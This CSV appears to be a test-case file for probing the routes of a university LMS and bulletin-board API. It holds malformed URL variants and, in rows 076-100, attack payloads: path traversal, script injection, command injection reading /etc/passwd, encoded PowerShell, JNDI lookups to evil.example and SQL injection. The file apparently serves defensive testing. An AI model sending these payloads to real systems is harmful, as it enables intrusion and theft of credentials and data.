case_id,case_class,request_intent,http_method,request_path,content_type,request_body,auth_scope,capture_var,capture_expr,accepted_codes
route_045,ambiguous,secure-route-typo,GET,/api//auth/me,,,student_alt,,,200|400|401|403|404
route_046,ambiguous,secure-route-typo,GET,/API/auth/me,,,student_alt,,,200|400|401|403|404
route_047,ambiguous,secure-route-typo,GET,/api/lms/course/my,,,admin,,,200|400|401|403|404
route_048,ambiguous,secure-route-typo,GET,/api/lms/courses//my,,,admin,,,200|400|401|403|404
route_049,ambiguous,secure-route-typo,GET,/api/lms/admin/course,,,admin,,,200|400|401|403|404
route_050,ambiguous,secure-route-typo,GET,/api/lms/admin/enrollment,,,admin,,,200|400|401|403|404
route_051,ambiguous,secure-route-typo,GET,/api/lms/admin/users/,,,admin,,,200|400|401|403|404
route_052,ambiguous,secure-route-typo,GET,/api/lms/admin/students/overview,,,admin,,,200|400|401|403|404
route_053,ambiguous,secure-route-typo,GET,/api/lms/assignment/1,,,professor,,,200|400|401|403|404
route_054,ambiguous,secure-route-typo,GET,/api/lms/assignments/1/,,,professor,,,200|400|401|403|404
route_055,ambiguous,secure-route-typo,GET,/api//lms/assignments/1,,,professor,,,200|400|401|403|404
route_056,ambiguous,secure-route-typo,GET,/API/lms/assignments/1,,,professor,,,200|400|401|403|404
route_057,ambiguous,secure-route-typo,GET,/api/lms/Assignments/1,,,professor,,,200|400|401|403|404
route_058,ambiguous,secure-route-typo,GET,/api/lms/assignments/1/,,,lms_student_a,,,200|400|401|403|404
route_059,ambiguous,secure-route-typo,GET,/api/lms/assignment/1,,,lms_student_a,,,200|400|401|403|404
route_060,ambiguous,secure-route-typo,GET,/api/lms/courses/1/assignments?detail=select%20%EB%AC%B8%20%EC%98%88%EC%8B%9C,,,lms_student_a,,,200|400|401|403|404
route_061,ambiguous,secure-route-typo,GET,/api/board/posts/%2e/,,,student,,,200|400|401|403|404
route_062,ambiguous,secure-route-typo,GET,/api/board/posts/%2e%2e;/,,,student_alt,,,200|400|401|403|404
route_063,ambiguous,secure-route-typo,GET,/api/lms/admin/enrollments/,,,admin,,,200|400|401|403|404
route_064,ambiguous,secure-route-typo,GET,/api/lms/submissions/1/grade/,,,professor,,,200|400|401|403|404
route_065,ambiguous,secure-route-typo,GET,/api/auth/me..%2f,,,student,,,200|400|401|403|404
route_066,ambiguous,secure-route-typo,GET,/api/auth/me%20,,,student_alt,,,200|400|401|403|404
route_067,ambiguous,secure-route-typo,GET,/api/lms/courses/1/assignments/,,,lms_student_a,,,200|400|401|403|404
route_068,ambiguous,secure-route-typo,GET,/api/board/posts//,,,student,,,200|400|401|403|404
route_069,ambiguous,secure-route-typo,GET,/api/board/posts/%2e%2e;,,,student_alt,,,200|400|401|403|404
route_070,ambiguous,secure-route-typo,GET,/api/lms/admin//users,,,admin,,,200|400|401|403|404
route_071,ambiguous,secure-route-typo,GET,/api//lms/assignments/4,,,professor,,,200|400|401|403|404
route_072,ambiguous,secure-route-typo,GET,/api/board/posts?keyword=오타&sort=latest&size=5&variant=route,,,student,,,200|400|401|403|404
route_073,ambiguous,secure-route-typo,GET,/api/board/posts/?keyword=도서관&sort=latest&size=5,,,student_alt,,,200|400|401|403|404
route_074,ambiguous,secure-route-typo,GET,/api/lms/courses//1/assignments,,,lms_student_a,,,200|400|401|403|404
route_075,ambiguous,secure-route-typo,GET,/api/lms/admin/courses/,,,admin,,,200|400|401|403|404
route_076,attack,secure-route-attack,GET,/api/board/posts?keyword=..%2Fadmin&sort=latest&page=0&size=5,,,student,,,200|400|401|403|404
route_077,attack,secure-route-attack,GET,/api/board/posts?keyword=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&sort=latest&page=0&size=5,,,student,,,200|400|401|403|404
route_078,attack,secure-route-attack,GET,/api/board/posts?keyword=%3Bwhoami&sort=latest&page=0&size=5,,,student,,,200|400|401|403|404
route_079,attack,secure-route-attack,GET,/api/board/posts?keyword=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D&sort=latest&page=0&size=5,,,student,,,200|400|401|403|404
route_080,attack,secure-route-attack,GET,/api/board/posts?keyword=union%20select%20password%20from%20users--&sort=latest&page=0&size=5,,,student,,,200|400|401|403|404
route_081,attack,secure-route-attack,GET,/api/board/posts/%2e%2e;/,,,student,,,200|400|401|403|404
route_082,attack,secure-route-attack,GET,/api/board/posts/..;/,,,student_alt,,,200|400|401|403|404
route_083,attack,secure-route-attack,GET,/api/board/posts?keyword=cmd.exe%20%2Fc%20whoami&sort=latest&page=0&size=5,,,student_alt,,,200|400|401|403|404
route_084,attack,secure-route-attack,GET,/api/board/posts?keyword=powershell%20-enc%20ZQB2AGkAbAA%3D&sort=latest&page=0&size=5,,,student_alt,,,200|400|401|403|404
route_085,attack,secure-route-attack,GET,/api/board/posts?keyword=%7Ccat%20%2Fetc%2Fpasswd&sort=latest&page=0&size=5,,,student_alt,,,200|400|401|403|404
route_086,attack,secure-route-attack,GET,/api/lms/courses/1/assignments?note=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,,admin,,,200|400|401|403|404
route_087,attack,secure-route-attack,GET,/api/lms/courses/1/assignments?note=%3Bwhoami,,,admin,,,200|400|401|403|404
route_088,attack,secure-route-attack,GET,/api/lms/courses/1/assignments?note=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D,,,admin,,,200|400|401|403|404
route_089,attack,secure-route-attack,GET,/api/lms/admin/enrollments/%2e%2e;/,,,admin,,,200|400|401|403|404
route_090,attack,secure-route-attack,GET,/api/lms/admin/users..%2f,,,admin,,,200|400|401|403|404
route_091,attack,secure-route-attack,GET,/api/lms/assignments/1/..;/,,,professor,,,200|400|401|403|404
route_092,attack,secure-route-attack,GET,/api/lms/assignments/1?note=..%2Fadmin,,,professor,,,200|400|401|403|404
route_093,attack,secure-route-attack,GET,/api/lms/assignments/1?note=cmd.exe%20%2Fc%20whoami,,,professor,,,200|400|401|403|404
route_094,attack,secure-route-attack,GET,/api/lms/assignments/1?note=powershell%20-enc%20ZQB2AGkAbAA%3D,,,professor,,,200|400|401|403|404
route_095,attack,secure-route-attack,GET,/api/lms/assignments/1?note=waitfor%20delay%20%270%3A0%3A5%27--,,,professor,,,200|400|401|403|404
route_096,attack,secure-route-attack,GET,/api/auth/me..%2e%2e;/,,,lms_student_a,,,200|400|401|403|404
route_097,attack,secure-route-attack,GET,/api/lms/courses/1/assignments/%2e/,,,lms_student_a,,,200|400|401|403|404
route_098,attack,secure-route-attack,GET,/api/auth/me%2f..%2f,,,student,,,200|400|401|403|404
route_099,attack,secure-route-attack,GET,/api/board/posts/%2e%2e;/,,,student_alt,,,200|400|401|403|404
route_100,attack,secure-route-attack,GET,/api/lms/admin/courses/%2e%2e;/,,,admin,,,200|400|401|403|404
